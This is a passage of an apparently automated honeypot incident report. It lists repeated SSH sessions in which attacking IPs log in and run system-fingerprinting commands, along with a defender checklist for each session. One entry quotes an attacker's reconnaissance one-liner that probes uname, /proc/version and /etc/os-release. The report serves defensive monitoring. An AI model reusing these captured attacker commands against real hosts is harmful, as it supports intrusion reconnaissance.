- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e52c5d5024b5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:54 |
| **Last Seen** | 2026-07-21 03:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:54:27` | `cowrie.session.connect` |
| `2026-07-21 03:54:27` | `cowrie.client.version` |
| `2026-07-21 03:54:27` | `cowrie.client.kex` |
| `2026-07-21 03:54:27` | `cowrie.login.success` |
| `2026-07-21 03:54:28` | `cowrie.session.params` |
| `2026-07-21 03:54:28` | `cowrie.command.input` |
| `2026-07-21 03:54:28` | `cowrie.log.closed` |
| `2026-07-21 03:54:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1273077648bc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:54 |
| **Last Seen** | 2026-07-21 03:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:54:32` | `cowrie.session.connect` |
| `2026-07-21 03:54:32` | `cowrie.client.version` |
| `2026-07-21 03:54:32` | `cowrie.client.kex` |
| `2026-07-21 03:54:33` | `cowrie.login.success` |
| `2026-07-21 03:54:33` | `cowrie.session.params` |
| `2026-07-21 03:54:33` | `cowrie.command.input` |
| `2026-07-21 03:54:34` | `cowrie.log.closed` |
| `2026-07-21 03:54:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2d3c004b0be

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:54 |
| **Last Seen** | 2026-07-21 03:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:54:37` | `cowrie.session.connect` |
| `2026-07-21 03:54:37` | `cowrie.client.version` |
| `2026-07-21 03:54:37` | `cowrie.client.kex` |
| `2026-07-21 03:54:38` | `cowrie.login.success` |
| `2026-07-21 03:54:38` | `cowrie.session.params` |
| `2026-07-21 03:54:38` | `cowrie.command.input` |
| `2026-07-21 03:54:39` | `cowrie.log.closed` |
| `2026-07-21 03:54:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c1718b2b52e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:54 |
| **Last Seen** | 2026-07-21 03:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:54:42` | `cowrie.session.connect` |
| `2026-07-21 03:54:42` | `cowrie.client.version` |
| `2026-07-21 03:54:42` | `cowrie.client.kex` |
| `2026-07-21 03:54:42` | `cowrie.login.success` |
| `2026-07-21 03:54:43` | `cowrie.session.params` |
| `2026-07-21 03:54:43` | `cowrie.command.input` |
| `2026-07-21 03:54:43` | `cowrie.log.closed` |
| `2026-07-21 03:54:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14b42198e0f1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:54 |
| **Last Seen** | 2026-07-21 03:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:54:47` | `cowrie.session.connect` |
| `2026-07-21 03:54:47` | `cowrie.client.version` |
| `2026-07-21 03:54:47` | `cowrie.client.kex` |
| `2026-07-21 03:54:47` | `cowrie.login.success` |
| `2026-07-21 03:54:48` | `cowrie.session.params` |
| `2026-07-21 03:54:48` | `cowrie.command.input` |
| `2026-07-21 03:54:48` | `cowrie.log.closed` |
| `2026-07-21 03:54:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-799f253a7984

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:54 |
| **Last Seen** | 2026-07-21 03:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:54:52` | `cowrie.session.connect` |
| `2026-07-21 03:54:52` | `cowrie.client.version` |
| `2026-07-21 03:54:52` | `cowrie.client.kex` |
| `2026-07-21 03:54:52` | `cowrie.login.success` |
| `2026-07-21 03:54:53` | `cowrie.session.params` |
| `2026-07-21 03:54:53` | `cowrie.command.input` |
| `2026-07-21 03:54:53` | `cowrie.log.closed` |
| `2026-07-21 03:54:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-286384e975b3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:54 |
| **Last Seen** | 2026-07-21 03:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:54:57` | `cowrie.session.connect` |
| `2026-07-21 03:54:57` | `cowrie.client.version` |
| `2026-07-21 03:54:57` | `cowrie.client.kex` |
| `2026-07-21 03:54:58` | `cowrie.login.success` |
| `2026-07-21 03:54:58` | `cowrie.session.params` |
| `2026-07-21 03:54:58` | `cowrie.command.input` |
| `2026-07-21 03:54:58` | `cowrie.log.closed` |
| `2026-07-21 03:54:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02b0cb668814

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:55 |
| **Last Seen** | 2026-07-21 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:55:02` | `cowrie.session.connect` |
| `2026-07-21 03:55:02` | `cowrie.client.version` |
| `2026-07-21 03:55:02` | `cowrie.client.kex` |
| `2026-07-21 03:55:02` | `cowrie.login.success` |
| `2026-07-21 03:55:03` | `cowrie.session.params` |
| `2026-07-21 03:55:03` | `cowrie.command.input` |
| `2026-07-21 03:55:03` | `cowrie.log.closed` |
| `2026-07-21 03:55:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac0a32dcc561

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:55 |
| **Last Seen** | 2026-07-21 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:55:07` | `cowrie.session.connect` |
| `2026-07-21 03:55:07` | `cowrie.client.version` |
| `2026-07-21 03:55:07` | `cowrie.client.kex` |
| `2026-07-21 03:55:07` | `cowrie.login.success` |
| `2026-07-21 03:55:08` | `cowrie.session.params` |
| `2026-07-21 03:55:08` | `cowrie.command.input` |
| `2026-07-21 03:55:08` | `cowrie.log.closed` |
| `2026-07-21 03:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cb145df4695

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:55 |
| **Last Seen** | 2026-07-21 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:55:12` | `cowrie.session.connect` |
| `2026-07-21 03:55:12` | `cowrie.client.version` |
| `2026-07-21 03:55:12` | `cowrie.client.kex` |
| `2026-07-21 03:55:13` | `cowrie.login.success` |
| `2026-07-21 03:55:13` | `cowrie.session.params` |
| `2026-07-21 03:55:13` | `cowrie.command.input` |
| `2026-07-21 03:55:13` | `cowrie.log.closed` |
| `2026-07-21 03:55:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f6f6959ccac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:55 |
| **Last Seen** | 2026-07-21 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:55:17` | `cowrie.session.connect` |
| `2026-07-21 03:55:17` | `cowrie.client.version` |
| `2026-07-21 03:55:17` | `cowrie.client.kex` |
| `2026-07-21 03:55:18` | `cowrie.login.success` |
| `2026-07-21 03:55:19` | `cowrie.session.params` |
| `2026-07-21 03:55:19` | `cowrie.command.input` |
| `2026-07-21 03:55:19` | `cowrie.log.closed` |
| `2026-07-21 03:55:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86920ec112ca

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:55 |
| **Last Seen** | 2026-07-21 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:55:22` | `cowrie.session.connect` |
| `2026-07-21 03:55:22` | `cowrie.client.version` |
| `2026-07-21 03:55:22` | `cowrie.client.kex` |
| `2026-07-21 03:55:22` | `cowrie.login.success` |
| `2026-07-21 03:55:23` | `cowrie.session.params` |
| `2026-07-21 03:55:23` | `cowrie.command.input` |
| `2026-07-21 03:55:23` | `cowrie.log.closed` |
| `2026-07-21 03:55:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63c1b2dfecda

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:55 |
| **Last Seen** | 2026-07-21 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:55:27` | `cowrie.session.connect` |
| `2026-07-21 03:55:27` | `cowrie.client.version` |
| `2026-07-21 03:55:27` | `cowrie.client.kex` |
| `2026-07-21 03:55:27` | `cowrie.login.success` |
| `2026-07-21 03:55:28` | `cowrie.session.params` |
| `2026-07-21 03:55:28` | `cowrie.command.input` |
| `2026-07-21 03:55:28` | `cowrie.log.closed` |
| `2026-07-21 03:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bf0a8c1f07e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:55 |
| **Last Seen** | 2026-07-21 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:55:32` | `cowrie.session.connect` |
| `2026-07-21 03:55:32` | `cowrie.client.version` |
| `2026-07-21 03:55:32` | `cowrie.client.kex` |
| `2026-07-21 03:55:32` | `cowrie.login.success` |
| `2026-07-21 03:55:33` | `cowrie.session.params` |
| `2026-07-21 03:55:33` | `cowrie.command.input` |
| `2026-07-21 03:55:33` | `cowrie.log.closed` |
| `2026-07-21 03:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d51f67a9d7a0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:55 |
| **Last Seen** | 2026-07-21 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:55:37` | `cowrie.session.connect` |
| `2026-07-21 03:55:37` | `cowrie.client.version` |
| `2026-07-21 03:55:37` | `cowrie.client.kex` |
| `2026-07-21 03:55:37` | `cowrie.login.success` |
| `2026-07-21 03:55:38` | `cowrie.session.params` |
| `2026-07-21 03:55:38` | `cowrie.command.input` |
| `2026-07-21 03:55:38` | `cowrie.log.closed` |
| `2026-07-21 03:55:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dde74b148b5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:55 |
| **Last Seen** | 2026-07-21 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:55:41` | `cowrie.session.connect` |
| `2026-07-21 03:55:41` | `cowrie.client.version` |
| `2026-07-21 03:55:42` | `cowrie.client.kex` |
| `2026-07-21 03:55:42` | `cowrie.login.success` |
| `2026-07-21 03:55:43` | `cowrie.session.params` |
| `2026-07-21 03:55:43` | `cowrie.command.input` |
| `2026-07-21 03:55:43` | `cowrie.log.closed` |
| `2026-07-21 03:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15b32998569d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:55 |
| **Last Seen** | 2026-07-21 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:55:46` | `cowrie.session.connect` |
| `2026-07-21 03:55:46` | `cowrie.client.version` |
| `2026-07-21 03:55:46` | `cowrie.client.kex` |
| `2026-07-21 03:55:47` | `cowrie.login.success` |
| `2026-07-21 03:55:48` | `cowrie.session.params` |
| `2026-07-21 03:55:48` | `cowrie.command.input` |
| `2026-07-21 03:55:48` | `cowrie.log.closed` |
| `2026-07-21 03:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4c3784ba7c1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:55 |
| **Last Seen** | 2026-07-21 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:55:52` | `cowrie.session.connect` |
| `2026-07-21 03:55:52` | `cowrie.client.version` |
| `2026-07-21 03:55:52` | `cowrie.client.kex` |
| `2026-07-21 03:55:52` | `cowrie.login.success` |
| `2026-07-21 03:55:53` | `cowrie.session.params` |
| `2026-07-21 03:55:53` | `cowrie.command.input` |
| `2026-07-21 03:55:53` | `cowrie.log.closed` |
| `2026-07-21 03:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0ba87f726ea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:55 |
| **Last Seen** | 2026-07-21 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:55:57` | `cowrie.session.connect` |
| `2026-07-21 03:55:57` | `cowrie.client.version` |
| `2026-07-21 03:55:57` | `cowrie.client.kex` |
| `2026-07-21 03:55:57` | `cowrie.login.success` |
| `2026-07-21 03:55:58` | `cowrie.session.params` |
| `2026-07-21 03:55:58` | `cowrie.command.input` |
| `2026-07-21 03:55:58` | `cowrie.log.closed` |
| `2026-07-21 03:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9df2e932a96

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:56 |
| **Last Seen** | 2026-07-21 03:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:56:02` | `cowrie.session.connect` |
| `2026-07-21 03:56:02` | `cowrie.client.version` |
| `2026-07-21 03:56:02` | `cowrie.client.kex` |
| `2026-07-21 03:56:03` | `cowrie.login.success` |
| `2026-07-21 03:56:03` | `cowrie.session.params` |
| `2026-07-21 03:56:03` | `cowrie.command.input` |
| `2026-07-21 03:56:03` | `cowrie.log.closed` |
| `2026-07-21 03:56:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f2ca4318f14

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:56 |
| **Last Seen** | 2026-07-21 03:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:56:05` | `cowrie.session.connect` |
| `2026-07-21 03:56:05` | `cowrie.client.version` |
| `2026-07-21 03:56:05` | `cowrie.client.kex` |
| `2026-07-21 03:56:09` | `cowrie.login.success` |
| `2026-07-21 03:56:12` | `cowrie.session.params` |
| `2026-07-21 03:56:12` | `cowrie.command.input` |
| `2026-07-21 03:56:12` | `cowrie.command.input` |
| `2026-07-21 03:56:12` | `cowrie.command.input` |
| `2026-07-21 03:56:12` | `cowrie.command.input` |
| `2026-07-21 03:56:12` | `cowrie.command.input` |
| `2026-07-21 03:56:12` | `cowrie.command.success` |
| `2026-07-21 03:56:12` | `cowrie.command.input` |
| `2026-07-21 03:56:12` | `cowrie.command.input` |
| `2026-07-21 03:56:12` | `cowrie.command.input` |
| `2026-07-21 03:56:12` | `cowrie.command.input` |
| `2026-07-21 03:56:13` | `cowrie.log.closed` |
| `2026-07-21 03:56:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc46b399b20c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:56 |
| **Last Seen** | 2026-07-21 03:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:56:07` | `cowrie.session.connect` |
| `2026-07-21 03:56:07` | `cowrie.client.version` |
| `2026-07-21 03:56:07` | `cowrie.client.kex` |
| `2026-07-21 03:56:07` | `cowrie.login.success` |
| `2026-07-21 03:56:08` | `cowrie.session.params` |
| `2026-07-21 03:56:08` | `cowrie.command.input` |
| `2026-07-21 03:56:08` | `cowrie.log.closed` |
| `2026-07-21 03:56:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e600a9037b1d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:56 |
| **Last Seen** | 2026-07-21 03:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:56:12` | `cowrie.session.connect` |
| `2026-07-21 03:56:12` | `cowrie.client.version` |
| `2026-07-21 03:56:12` | `cowrie.client.kex` |
| `2026-07-21 03:56:13` | `cowrie.login.success` |
| `2026-07-21 03:56:13` | `cowrie.session.params` |
| `2026-07-21 03:56:13` | `cowrie.command.input` |
| `2026-07-21 03:56:14` | `cowrie.log.closed` |
| `2026-07-21 03:56:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d16794b8574b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:56 |
| **Last Seen** | 2026-07-21 03:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:56:17` | `cowrie.session.connect` |
| `2026-07-21 03:56:17` | `cowrie.client.version` |
| `2026-07-21 03:56:17` | `cowrie.client.kex` |
| `2026-07-21 03:56:18` | `cowrie.login.success` |
| `2026-07-21 03:56:19` | `cowrie.session.params` |
| `2026-07-21 03:56:19` | `cowrie.command.input` |
| `2026-07-21 03:56:19` | `cowrie.log.closed` |
| `2026-07-21 03:56:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e1d09e342c2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:56 |
| **Last Seen** | 2026-07-21 03:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
